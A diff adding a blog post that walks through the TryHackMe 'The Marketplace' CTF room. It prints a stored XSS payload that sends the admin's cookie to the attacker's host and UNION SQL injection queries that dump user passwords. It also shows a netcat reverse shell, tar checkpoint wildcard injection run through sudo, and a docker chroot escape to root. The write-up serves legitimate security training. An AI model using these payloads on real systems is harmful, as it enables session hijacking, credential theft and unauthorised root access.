+                <li><a href="https://twitter.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+              
+            
+              
+                <li><a href="https://github.com/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+              
+            
+              
+                <li><a href="https://www.instagram.com/furkn.dniz/" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-instagram" aria-hidden="true"></i><span class="label">Instagram</span></a></li>
+              
+            
+              
+                <li><a href="https://www.linkedin.com/in/Mr0Wido" rel="nofollow noopener noreferrer me" itemprop="sameAs" target="_blank"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">LinkedIn</span></a></li>
+              
+            
+          
+    
+          
+    
+          
+            <li>
+              <a href="mailto:mr0wido@protonmail.com" rel="me" class="u-email">
+                <meta itemprop="email" content="mr0wido@protonmail.com">
+                <i class="fas fa-fw fa-envelope-square" aria-hidden="true"></i><span class="label">Email</span>
+              </a>
+            </li>
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          
+    
+          <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+        </ul>
+      </div>
+    </div>
+  
+
+  </div>
+</div>
+
+      </div>
+      <div class="content-container">
+        <main class="default">
+          <div class="post">
+  <h1 class="post__title">TryHackMe - The Marketplace</h1>
+  <div class="post__content">
+    <p>Can you take over The Marketplace’s infrastructure?</p>
+
+<p>This is a medium level machine and looking at the tags we will be focusing on web, xss, docker and sqli.</p>
+
+<p>The sysadmin of The Marketplace, Michael, has given you access to an internal server of his, so you can pentest the marketplace platform he and his team has been working on. He said it still has a few bugs he and his team need to iron out.</p>
+
+<p>Can you take advantage of this and will you be able to gain root access on his server?</p>
+
+<p>Created by <a href="https://tryhackme.com/p/jammy" rel="external nofollow noopener" target="_blank">jammy</a></p>
+
+<p><br></p>
+
+<h3 id="1-what-is-flag-1">1. What is flag 1?</h3>
+
+<p>Let’s do a <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSCV 10.10.171.214
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/nmap.png" alt="nmap"></p>
+
+<p>Three ports are open. These are <code class="language-plaintext highlighter-rouge">22/tcp SSH, 80/tcp HTTP, 32768/tcp HTTP</code></p>
+
+<p>Let’s visit the website running on <code class="language-plaintext highlighter-rouge">80/tcp</code> port.</p>
+
+<p>Here is a homepage.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/home.png" alt="home"></p>
+
+<p>There are also <code class="language-plaintext highlighter-rouge">login</code> and <code class="language-plaintext highlighter-rouge">signup</code> pages.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/login.png" alt="login"></p>
+
+<p>I register as <code class="language-plaintext highlighter-rouge">new:new</code> on the sign up page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/signup.png" alt="signup"></p>
+
+<p>After that, when I log in, two new pages appear.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-pages.png" alt="new-pages"></p>
+
+<p>Let’s go to the <code class="language-plaintext highlighter-rouge">new-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/new-listing.png" alt="new-listing"></p>
+
+<p>I can write something on this page and upload it to the system. As far as I understand, what I write is directly saved in the database. So maybe we can access the database from here.</p>
+
+<p>The message page is as follows.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages"></p>
+
+<p>I’m checking the <code class="language-plaintext highlighter-rouge">robots.txt</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/robots.png" alt="robots"></p>
+
+<p>I see the <code class="language-plaintext highlighter-rouge">/admin</code> page is accessible.</p>
+
+<p>Let’s go to the admin page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin-error.png" alt="admin-error"></p>
+
+<p>I ran a <code class="language-plaintext highlighter-rouge">gobuster</code> scan at this point, but nothing useful came up. I tried <code class="language-plaintext highlighter-rouge">SQLi</code> using <code class="language-plaintext highlighter-rouge">sqlmap</code> on the login page, but it didn’t work either.</p>
+
+<p>Then I decided to try <code class="language-plaintext highlighter-rouge">XSS</code> on the <code class="language-plaintext highlighter-rouge">New-listing</code> page.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss1.png" alt="xss1"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ &lt;script&gt;alert('Mr0Wido')&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Yes, it did work.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/xss2.png" alt="xss2"></p>
+
+<p>There seems to be an <code class="language-plaintext highlighter-rouge">XSS vulnerability</code>. And maybe with the XSS vulnerability, we can access the cookies of the admin user.</p>
+
+<p>But I still have doubts about how to do this somehow the admin user needs to interact.</p>
+
+<p>I’ve been wandering around the site a little more and this catches my attention.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report.png" alt="report"></p>
+
+<p>In other words, we can report the list we created to the admin. So The admin will review the report we sent and click on the payload that we will upload. This means that we may have the cookies of the admin user.</p>
+
+<p>Let ‘s do it.</p>
+
+<p>So ı found this GitHub repository for stealing cookies. <a href="https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md" rel="external nofollow noopener" target="_blank">Steal Cookies with Reflected XSS</a>. <strong><code class="language-plaintext highlighter-rouge">(It's don't working.)</code></strong></p>
+
+<p>The page says there is a python script that steals cookies, we need to run it first. <a href="https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py" rel="external nofollow noopener" target="_blank">lnxg33k’s cookie stealer script</a></p>
+
+<p>Then our payload code is as follows:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+alert(document.cookie);
+var i=new Image;
+i.src="http://&lt;your-ip&gt;:8888/?"+document.cookie;
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>The python script above didn’t work for me and I edited the script again. <a href="https://github.com/Mr0Wido/xss-cookie-stealer-python-script" rel="external nofollow noopener" target="_blank">Reformed XSS Cookie Stealer Python Script</a>
+Let’s try.</p>
+
+<p>Let’s run the script first.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script1.png" alt="script1"></p>
+
+<p>Now let’s <code class="language-plaintext highlighter-rouge">create a New-listing</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/payload.png" alt="payload"></p>
+
+<p>The payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report2.png" alt="report2"></p>
+
+<p>Now let’s get the admin’s cookie by reporting the payload we created.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/report1.png" alt="report1"></p>
+
+<p><img src="/assets/img/tryhackme/marketplace/messages.png" alt="messages"></p>
+
+<p>Yes, it worked.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/script2.png" alt="script2"></p>
+
+<p>The top token is for my user and the bottom is for the admin user.</p>
+
+<p>Let’s go to the site and exchange it for our own token.</p>
+
+<p>For <code class="language-plaintext highlighter-rouge">Firefox</code>, we will change the cookie part in <code class="language-plaintext highlighter-rouge">Right-click &gt; Inspect &gt; Storage</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/change.png" alt="change"></p>
+
+<p>And when we <code class="language-plaintext highlighter-rouge">refresh the page</code>, we can now <code class="language-plaintext highlighter-rouge">access the admin</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/admin.png" alt="admin"></p>
+
+<p>As you will see here, there are some users and their ids.</p>
+
+<p><code class="language-plaintext highlighter-rouge">1:system - 2:michael - 3:jake</code></p>
+
+<p>Others are users that I created. I’m working a little messy <image class="emoji" title="grin" alt="😁" src="https://github.githubassets.com/images/icons/emoji/unicode/1f601.png?v8" style="vertical-align: middle;             max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.alt)">           </image></p>
+
+<p><br></p>
+
+<h3 id="2-what-is-flag-2-usertxt">2. What is flag 2? (User.txt)</h3>
+
+<p>It’s obvious that there is an <code class="language-plaintext highlighter-rouge">SQLi vulnerability</code> here, but let’s verify it anyway.</p>
+
+<p>I click on <code class="language-plaintext highlighter-rouge">Michael</code> whose id is 2 and write <code class="language-plaintext highlighter-rouge">2-1</code> instead of user=2 in the URL.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/detect.png" alt="detect"></p>
+
+<p>And as you can see it returned to the system user with id 1.</p>
+
+<p>We have confirmed the existence of the SQLi vulnerability.</p>
+
+<p>To find out the number of columns, I proceed as follows, increasing one at a time.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,2,3,4,5--
+</code></pre></div></div>
+
+<p>When I get to the last 5, I get the following error.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/error_column.png" alt="error_column"></p>
+
+<p>So we can go up to 4.</p>
+
+<p>Let’s get the information from the database.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(schema_name),3,4 FROM information_scheam.schemata-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/schemata.png" alt="schemata"></p>
+
+<p>I continue from the <code class="language-plaintext highlighter-rouge">marketplace</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(table_name),3,4 FROM information_scheam.tables WHERE table_schema='marketplace'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/tables.png" alt="tables"></p>
+
+<p>There are two important tables, one is <code class="language-plaintext highlighter-rouge">messages</code> and the other is <code class="language-plaintext highlighter-rouge">users</code>.
+First I look at the <code class="language-plaintext highlighter-rouge">messages table</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='messages'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/column-messages.png" alt="column-messages"></p>
+
+<p>Let’s dump the <code class="language-plaintext highlighter-rouge">contents of the messages</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~~',message_content,'~~',user_from,'~~',user_to),3,4 FROM messages-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/content-messages.png" alt="content-messages"></p>
+
+<p>It seems that the user whose id is 1, is the system. The system sent a message to Jake, and the <code class="language-plaintext highlighter-rouge">message includes Jake's ssh password</code>. Let’s keep this information in our pocket now. And let’s go to the users table.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(column_name),3,4 FROM information_scheam.columns WHERE table_name='users'-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/users.png" alt="users"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>? user=0 UNION SELECT 1,group_concat(id,'~',username,'~',password),3,4 FROM users-- 
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/passwords.png" alt="passwords"></p>
+
+<p>I can try to crack these passwords, but first I want to check if the password I found for Jake works. If it doesn’t work, we continue from here.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh jake@10.10.171.214
+</code></pre></div></div>
+
+<p>Yes it worked. We are inside.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/jake.png" alt="jake"></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">user flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/user-flag.png" alt="user-flag"></p>
+
+<p><br></p>
+
+<h3 id="3-what-is-flag-3-roottxt">3. What is flag 3? (Root.txt)</h3>
+
+<p>Let’s try the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p>
+
+<p>And ther it is.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/sduol.png" alt="sduol"></p>
+
+<p>We can run <code class="language-plaintext highlighter-rouge">/opt/backups/backup.sh</code> as Michael. Without requiring a password.</p>
+
+<p>Let’s see what’s in it.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/backup-sh.png" alt="backup-sh"></p>
+
+<p>I couldn’t find how to upgrade permissions. When I started researching, I found a way. Let’s try.</p>
+
+<p>First I go to <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="external nofollow noopener" target="_blank">Pentestmonkey Reverse Shell Cheat Sheet</a>. And for netcat, I choose:</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/nc.png" alt="nc"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f
+</code></pre></div></div>
+
+<p>Now I’m setting up a <code class="language-plaintext highlighter-rouge">netcat</code> listener on my own machine.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 5555
+</code></pre></div></div>
+
+<p>Then I run the following codes in order.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cd /opt/backups
+$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.8.86.168 5555 &gt;/tmp/f" &gt; shell.sh
+$ echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
+$ echo "" &gt; --checkpoint=1
+$ chmod 777 backup.tar shell.sh
+$ sudo -u michael ./backup.sh
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/marketplace/backups.png" alt="backups"></p>
+
+<p>And we’re in.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/michael-in.png" alt="michael-in"></p>
+
+<p>HUH! <code class="language-plaintext highlighter-rouge">999(docker)</code>. It’s interesting.</p>
+
+<p>I’m looking at <a href="https://gtfobins.github.io/gtfobins/docker/" rel="external nofollow noopener" target="_blank">GTFOBins</a> to see if I can find anything about docker.</p>
+
+<p>Let’s try this.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/gtf.png" alt="gtf"></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+</code></pre></div></div>
+
+<p>And we are <code class="language-plaintext highlighter-rouge">root</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/rootin.png" alt="rootin"></p>
+
+<p>Let’s get the <code class="language-plaintext highlighter-rouge">root flag</code>.</p>
+
+<p><img src="/assets/img/tryhackme/marketplace/root-flag.png" alt="root-flag"></p>
+
+<p><br></p>
+
+<p>It was nice CTF. I hope you learned something and had fun. But that’s it for now till next time take care <image class="emoji" title="wave" alt="👋" src="https://github.githubassets.com/images/icons/emoji/unicode/1f44b.png?v8" style="vertical-align: middle;             max-width: 1em; visibility: hidden;" onload="this.style.visibility='visible'" onerror="this.replaceWith(this.alt)">           </image></p>
+
+<p><br></p>
+
+  </div>
+  <div class="post__footer">
+    <p class="post__date">
+      <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i>  May 11, 2023</p>
+    <div class="post__categories">
+      
+      
+      <p><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: <a href="/categories/#TryHackMe">TryHackMe</a></p>
+            
+    </div>      
+    
+    <div class="post__tags">
+      <p class="post__tags-title">
+        <span class="post__tags__title"><i class="fas fa-fw fa-tags" aria-hidden="true"></i>Tags: </span>
+        <span class="post__tags-container">
+          
+          <span class="post__tags-item">sqli, xss, docker</span>
+          
+        </span>
+      </p>
+    </div>
+    
+  </div>
+</div>
+<br>
+<!-- Twitter Share Button -->
+<a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20The%20Marketplace&amp;url=http://localhost:4000/tryhackme-the-marketplace/&amp;via=Mr0Wido" target="_blank" rel="noopener noreferrer" class="share-btn tweet-btn" title="Share on Twitter">
+    Tweet
+</a>
+  
+<!-- LinkedIn Share Button -->
+<a href="https://www.linkedin.com/sharing/share-offsite/?url=http://localhost:4000/tryhackme-the-marketplace/" target="_blank" rel="noopener noreferrer" class="share-btn" title="Share on LinkedIn">
+    LinkedIn
+</a>
+  
+  
+
+<br>
+
+
+<div id="disqus_thread"></div>
+<script>
+    var disqus_config = function () {
+    this.page.url = 'http://localhost:4000/tryhackme-the-marketplace/';
+    this.page.identifier = '/tryhackme-the-marketplace';
+    
+    };
+
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://mr0widos-blog.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="external nofollow noopener" target="_blank">comments powered by Disqus.</a>
+</noscript>
+
+
+
+        </main>
+      </div>
+    </div>
+
+
+
+
+    <button onclick="topFunction()" id="myBtn" title="Go to top"><i class="fas fa-chevron-circle-up fa-2x"></i></button>
+    <footer>
+  <div class="footer">
+    © Copyright 2023 Mr0Wido's Blog | Powered by Jekyll | <a href="/tos/">Terms of Service</a> | <a href="/disclaimer/">Disclaimer</a>
+  </div>
+</footer>
+
+    <!-- script -->
+    <script src="/assets/js/nav.js"></script>
+    <script src="/assets/js/clip.js"></script>
+    <script src="/assets/js/scroll-top.js"></script>
+    <script src="/assets/js/search.js"></script>
+    <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "headline": "TryHackMe - The Marketplace",
+    "author": {
+      "@type": "Person",
+      "name": ""
+    },
+    "datePublished": "2023-05-11 00:00:00 +0300",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http://localhost:4000/tryhackme-the-marketplace/"
+    },
+    "articleSection": "TryHackMe"
+  }
+</script>
+  </body>
+</html>
